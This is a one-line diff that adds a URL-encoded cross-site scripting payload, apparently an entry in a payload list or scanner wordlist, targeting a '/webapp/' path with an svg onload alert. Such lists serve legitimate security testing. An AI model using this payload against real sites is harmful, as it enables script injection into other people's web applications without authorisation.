@@ -1,0 +1,1 @@
+/webapp/?fccc%27\%22%3E%3Csvg/onload=alert(/xss/)%3E
